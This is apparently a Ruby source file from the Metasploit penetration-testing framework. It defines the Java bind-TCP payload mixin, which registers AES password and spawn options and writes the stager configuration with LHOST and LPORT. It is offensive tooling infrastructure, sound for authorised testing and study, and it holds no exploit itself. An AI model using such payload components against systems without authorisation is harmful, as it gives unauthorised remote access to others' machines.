# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Java that speaks TCP
#
###

module Payload::Java::BindTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options

  #
  # Register Java reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
      Msf::OptString.new('AESPassword', [false, "Password for encrypting communication", '']),
      Msf::OptInt.new('Spawn', [true, "Number of subprocesses to spawn", 2])
    ])
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  def include_send_uuid
      false
  end

  #
  # Generate configuration that is to be included in the stager.
  #
  def stager_config(opts={})
    ds = opts[:datastore] || datastore
    spawn = ds["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    pass = ds["AESPassword"] || ''
    if pass != ""
      c << "AESPassword=#{pass}\n"
    end
    c << "LHOST=#{ds["LHOST"]}\n" if ds["LHOST"]
    c << "LPORT=#{ds["LPORT"]}\n" if ds["LPORT"]

    c
  end

  def class_files
    # TODO: we should handle opts in class_files as well
    if datastore['AESPassword'] && datastore['AESPassword'].length > 0
      [
        ["metasploit", "AESEncryption.class"],
      ]
    else
      []
    end
  end

end

end
